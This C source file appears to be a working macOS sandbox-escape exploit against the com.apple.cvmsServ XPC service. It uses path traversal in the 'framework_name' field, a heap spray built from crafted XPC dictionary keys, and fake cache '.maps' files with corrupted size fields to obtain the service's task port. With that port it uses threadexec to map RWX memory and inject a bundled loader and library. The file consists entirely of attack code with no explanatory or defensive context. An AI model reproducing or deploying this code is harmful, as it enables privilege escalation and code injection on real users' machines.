#include <sandbox.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <xpc/xpc.h>
#include <time.h>
#include <mach/mach.h>
#include <mach/thread_status.h>
#if __cplusplus
extern "C" {
#endif
#include <threadexec/threadexec.h>
#if __cplusplus
}
#endif
#include <CommonCrypto/CommonDigest.h>
#include <sys/stat.h>
#include <mach-o/dyld.h>
#include <dlfcn.h>
#define _XOPEN_SOURCE
#include <ucontext.h>

#define PATHRAND 128

#ifdef __cplusplus
extern "C" {
#endif
int sandbox_init_with_parameters(const char *profile,
	uint64_t flags,
	const char *const parameters[],
	char **errorbuf);

mach_port_t _xpc_dictionary_extract_mach_send(xpc_object_t, char const *);
#ifdef __cplusplus
}
#endif

#define TRIAL 0x1000
#define PLUGIN_NAME "/System/Library/Frameworks/OpenGL.framework/Libraries/libGLVMPlugin.dylib"

char prefix[0x100];
char *tmpdir;

char *conf(int id) {
	char buf[0x400];
	char buf2[0x400];
	if(confstr(id, buf, sizeof(buf)) && realpath(buf, buf2)) {
		printf("%d: %s\n", id, buf2);
	} else {
		puts("conf failed");
		return NULL;
	}
	strcat(buf2, "/");
	return strdup(buf2);
}

char data_exp[0x1000];
int data_exp_size = sizeof(data_exp);
struct {
	uint64_t lib_size;
	uint64_t bitcode_size;
	uint64_t plugin_size;
	uint8_t hash[32];
	uint32_t revision;
	uint32_t flags;
	uint32_t count;
	uint16_t loadable;
	uint16_t bitcode_offset;
	uint16_t plugin_offset;
	uint16_t entry_offset;
	char pad[4];
	size_t pointers[0x12];
} maps_exp_ = {
	.lib_size=UINT64_MAX,
	.bitcode_size=0,
	.plugin_size=UINT64_MAX,
	.hash={},
	.revision=20120507,
	.flags=0x31A,
	.count=0,
	.loadable=1,
	.bitcode_offset=0,
	.plugin_offset=0,
	.entry_offset=0x30
};
char *maps_exp = (char *)&maps_exp_;
long maps_exp_size = sizeof(maps_exp_);

xpc_object_t mem_descriptor(void *mem, size_t size, size_t offset_in_page, size_t real_size, bool trigger) {
	xpc_object_t elements[3] = {
		xpc_shmem_create(mem, size),
		xpc_uint64_create(offset_in_page),
		xpc_uint64_create(real_size)
	};

	if(trigger) ((long *)elements[0])[4] = offset_in_page - 1;

	return xpc_array_create(elements, 3);
}

const char *serviceName = "com.apple.cvmsServ";

void my_error(const char *name) {
	printf("error: %s\n", name);
}

xpc_connection_t connect(bool create) {
	xpc_connection_t conn = xpc_connection_create_mach_service(serviceName, NULL, 0);
	if (conn == NULL) {
		my_error("xpc_connection_create_mach_service");
		exit(1);
	}

	xpc_connection_set_event_handler(conn, ^(xpc_object_t) {
		// printf("Received message in generic event handler: %p\n", obj);
		// printf("%s\n", xpc_copy_description(obj));
	});

	xpc_connection_resume(conn);

	if(create) {
		xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
		xpc_dictionary_set_int64(msg, "message", 1);
		xpc_connection_send_message(conn, msg);
		// usleep(20000);
	}

	return conn;
}

char *pad(int size, int i) {
	static char value[0x10000];
	// char *value = (char *)mmap(NULL, ((size + 1) + 0xfff) & ~0xfff, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
	int start = sprintf(value, "0x%x", i);
	memset(value + start, 0x41, size);
	value[size] = '\0';
	return value;
}

void spray_value(xpc_object_t msg) {
	xpc_dictionary_set_value(msg, "ey", xpc_fd_create(0));

	if(true) {
		// prepare *neighboring* chunks which fills the freelist
		xpc_object_t subdict = xpc_dictionary_create(NULL, NULL, 0);
		for(int i = 0; i < 0x500; i++) {
			xpc_dictionary_set_value(subdict, pad(0x50 - 41, i), xpc_bool_create(true));
		}
		xpc_dictionary_set_value(msg, "free", subdict);
	}

	// lets spoof deserializer to free the first "free" key
	xpc_dictionary_set_value(msg, "fref", xpc_bool_create(true));
	static bool seen_free = false;
	xpc_dictionary_apply(msg, ^bool(const char *key, xpc_object_t) {
		if(!strcmp(key, "free")) {
			seen_free = true;
		}
		if(!memcmp(key, "fre", 3) && key[3] != 'e') {
			if(!seen_free) {
				puts("check other key!");
				exit(1);
			}
			memcpy((void *)key, "free", 4);
		}
		return true;
	});
}

xpc_object_t init_msg;

xpc_connection_t spray() {
	xpc_connection_t conn = connect(false);
	xpc_object_t msg;

	msg = xpc_dictionary_create(NULL, NULL, 0);
	xpc_dictionary_set_int64(msg, "message", 1);
	spray_value(msg);

	xpc_connection_send_message(conn, msg);
	// usleep(20000);

	xpc_dictionary_set_int64(msg, "message", 4);
	char buf[0x1000];
	strcpy(buf, "../../../../");
	strcat(buf, tmpdir);
	for(int i = 0; i < PATHRAND; i++)
		strcat(buf, (rand() % 2) ? "./" : "//");
	strcat(buf, "spray");
	strcat(buf, prefix);
	xpc_dictionary_set_string(init_msg, "framework_name", buf);
	xpc_connection_send_message_with_reply(conn, init_msg, NULL, ^(xpc_object_t) {
		puts("spraying...");
	});
	// xpc_release(conn);

	return conn;
}

uint64_t heap_index;

vm_address_t allocate(mach_port_t port, size_t size, void **map) {
	vm_prot_t PROTECTION = VM_PROT_READ | VM_PROT_WRITE;
	vm_address_t address = 0;
	if(vm_allocate(port, &address, size, true)) {
		my_error("vm_allocate");
		exit(1);
	}
	if(map) {
		mach_port_t handle;
		if(mach_make_memory_entry_64(port, (memory_object_size_t *)&size, address, PROTECTION | 0x400000, &handle, 0)) {
			my_error("mach_make_memory_entry_64");
			exit(1);
		}
		if(vm_map(mach_task_self(), (vm_address_t *)map, size, 0, 1, handle, 0, false, PROTECTION, PROTECTION, VM_INHERIT_NONE)) {
			my_error("vm_map");
			exit(1);
		}
	}
	return address;
}

bool vm_read_chk(vm_map_t target_task, size_t address, void *data, vm_size_t size) {
	mach_msg_type_number_t outCnt;
	memset(data, 0, size);
	vm_address_t dataPtr;
	if(vm_read(target_task, address, size, &dataPtr, &outCnt)) {
		puts("error: vm_read");
		return false;
	}
	// printf("vm_read(%p, 0x%x): 0x%x\n", address, size, outCnt);
	memcpy(data, (void *)dataPtr, outCnt);
	vm_deallocate(mach_task_self(), dataPtr, outCnt);
	return true;
}

__asm__(".data\n_loader_start: .incbin \"" CURRENT_DIR "/../loader/loader.bin\"\n_loader_end:");
__asm__(".data\n_library_start: .incbin \"" CURRENT_DIR "/../sbx/cvm_side\"\n_library_end:");

extern char loader_start[], loader_end[];
extern char library_start[], library_end[];

void spoof(mach_port_t port) {
	thread_act_array_t threads;
	mach_msg_type_number_t count;
	task_threads(port, &threads, &count);
	printf("threads: %d\n", count);
	static bool first = true;

	threadexec_t tx = threadexec_init(port, threads[1], TX_BORROW_THREAD_PORT | (first ? TX_SUSPEND : 0));
	puts("yey");

	size_t res = -1, res2 = -1;
	threadexec_call_cv(tx, &res, sizeof(res), (void *)&mmap,
		6,
		TX_CARG_LITERAL(uint64_t, 0),
		TX_CARG_LITERAL(uint64_t, (0x1000 + library_end - library_start)),
		TX_CARG_LITERAL(uint64_t, 7),
		TX_CARG_LITERAL(uint64_t, MAP_JIT | MAP_ANON | MAP_PRIVATE),
		TX_CARG_LITERAL(uint64_t, -1),
		TX_CARG_LITERAL(uint64_t, 0)
		);

	printf("0x%lx\n", res);
	printf("%p %p\n", dlopen, dlsym);

	vm_write(port, res, (vm_offset_t)loader_start, loader_end - loader_start);
	vm_write(port, res + 0x1000, (vm_offset_t)library_start, library_end - library_start);

	first = false;
	threadexec_call_cv(tx, &res2, sizeof(res), (void *)(res + 0x5D),
		4,
		TX_CARG_LITERAL(uint64_t, (res + 0x1000)),
		TX_CARG_LITERAL(uint64_t, dlopen),
		TX_CARG_LITERAL(uint64_t, dlsym),
		TX_CARG_LITERAL(uint64_t, NULL)
	);

	puts("done!");
}

bool
trigger()
{
	// xpc_connection_t spray_conn = spray();
	xpc_connection_t conn = connect(true);
	xpc_object_t msg;

	char buf[0x1000];
	strcpy(buf, "../../../../");
	strcat(buf, tmpdir);
	for(int i = 0; i < PATHRAND; i++)
		strcat(buf, (rand() % 2) ? "./" : "//");
	strcat(buf, "exp");
	strcat(buf, prefix);
	xpc_dictionary_set_string(init_msg, "framework_name", buf);

#define COUNT 1
	for(int i = 0; i < COUNT; i++) {
		xpc_connection_send_message_with_reply(conn, init_msg, NULL, ^(xpc_object_t resp) {
			printf("Received second message: %p\n%s\n", resp, xpc_copy_description(resp));
		});

		msg = xpc_dictionary_create(NULL, NULL, 0);
		xpc_dictionary_set_int64(msg, "message", 7);
		xpc_dictionary_set_uint64(msg, "heap_index", heap_index);

		xpc_object_t resp = xpc_connection_send_message_with_reply_sync(conn, msg);

		{
			static int count = 0;
			count++;
			int pid = 0;
			mach_port_t port = _xpc_dictionary_extract_mach_send((xpc_connection_t)resp, "vm_port");
			printf("Received second message: %p\n%s\n", resp, xpc_copy_description(resp));

			if(port) {
				int res = pid_for_task(port, &pid);
				printf("try: %d %d %d\n", port, res, pid);
				if(!res) {
					puts("success!");
					spoof(port);
					return true;
				}
			}

			if(xpc_get_type(resp) == &_xpc_type_error) {
				// exit(0);
			}
		}
	}

	return false;
}

void write_file(const char *buf, void *data, size_t size) {
	int fd = open(buf, O_CREAT|O_WRONLY, 0777);
	if(fd == -1) {
		my_error("open");
		exit(1);
	}
	write(fd, data, size);
	close(fd);
}

void *cvm_main(void *) {
	struct stat statbuf;

	tmpdir = conf(0x10001);
	if(stat("/System/Library/Frameworks/OpenGL.framework/Libraries/libLLVMContainer.dylib", &statbuf)) {
		my_error("stat");
		return NULL;
	}
	maps_exp_.lib_size = statbuf.st_size;

	if(stat(PLUGIN_NAME, &statbuf)) {
		my_error("stat");
		return NULL;
	}
	maps_exp_.plugin_size = statbuf.st_size;

	CC_SHA256(data_exp, sizeof(data_exp), maps_exp_.hash);

	setvbuf(stdout, 0, _IONBF, 0);
	sprintf(prefix, "%lX", clock());

	char logpath[0x100];
	sprintf(logpath, "%s/%s", tmpdir, "log.txt");
	unlink(logpath);

	close(0);
	close(1);
	close(2);
	int fd = open(logpath, O_CREAT|O_WRONLY, 0777);
	for(int i = 0; i < 3; i++)
		dup(fd);

	char buf[0x400];
	int id = geteuid();

#define WRITE(type) \
	snprintf(buf, sizeof(buf), "%s/%s%s.x86_64.%d.data", tmpdir, #type, prefix, id); \
	write_file(buf, data_##type, data_##type##_size); \
	snprintf(buf, sizeof(buf), "%s/%s%s.x86_64.%d.maps", tmpdir, #type, prefix, id); \
	write_file(buf, maps_##type, maps_##type##_size);

	{
		size_t offsets[] = {
			// 0x3b
		};

		uint32_t *addr = &mach_task_self_;
		while(true) {
			if(*addr == 0x103) {
				break;
			}
			addr++;
		}

		for(int i = 0; i < sizeof(offsets) / sizeof(offsets[0]); i++) {
			uint32_t **base = (uint32_t **)(maps_exp + 0x50 + offsets[i] * 8);
			*base = addr;
		}
	}

	{
		size_t offsets[] = {
			0xf, 0x11
		};

		// Just peek any library area that contains "0x103" dword in 8-byte aligned storage
		extern size_t NSOwnedPointerHashCallBacks;
		size_t *addr = &NSOwnedPointerHashCallBacks;
		while(true) {
			if(*addr == 0x103) {
				break;
			}
			addr++;
		}

		/*
		GetMemory(index)
			rax := UserInput
			[rax+0x38] = X
			[X+0x30] = Length (UINT64_MAX)
			[X+0x28] = Y (0)
			[Y+0x18*index+0x10] = 0x103 (== mach_task_self_)
		*/
		size_t *target_addr = (size_t *)(((size_t *)&_xpc_error_termination_imminent)[4] + 0x10 - 0x38);
		extern int num_frames;
		heap_index = (0xaaaaaaaaaaaaaabLL * (
			((size_t)addr - 0x10 -
			((size_t *)target_addr[0x38 >> 3])[0x28 >> 3])
			>> 3
		) % (1LL << 61));
		// index * 0x18 = (0x00007FFF9963CFB8 - 0x00007FFF9978EB68)
		printf("0x%llX\n", heap_index);

		for(unsigned long i = 0; i < sizeof(offsets) / sizeof(offsets[0]); i++) {
			size_t **base = (size_t **)(maps_exp + 0x50 + offsets[i] * 8);
			*base = target_addr;
		}
	}

	WRITE(exp);

	srand(time(NULL));

	init_msg = xpc_dictionary_create(NULL, NULL, 0);
	xpc_dictionary_set_int64(init_msg, "message", 4);
	struct {
		uint64_t size;
		int arch;
		int flags;
	} _id = {
		0xFFFFFFFFFFF0000, 0x2, *(short *)&maps_exp[0x3c]
	};
	xpc_dictionary_set_value(init_msg, "args", xpc_data_create(&_id, 16));
	spray_value(init_msg);
	xpc_dictionary_set_string(init_msg, "bitcode_name", "");
	xpc_dictionary_set_string(init_msg, "plugin_name", PLUGIN_NAME);

	for(int i = 0; i < TRIAL; i++) {
		for(int i = 0; i < 8; i++) {
			spray();
		}

		if(trigger())
			break;
		usleep(200000);
	}
	// for(int i = 0; i < TRIAL; i++) {
	// 	xpc_release(conn[i]);
	// }
	return NULL;
}
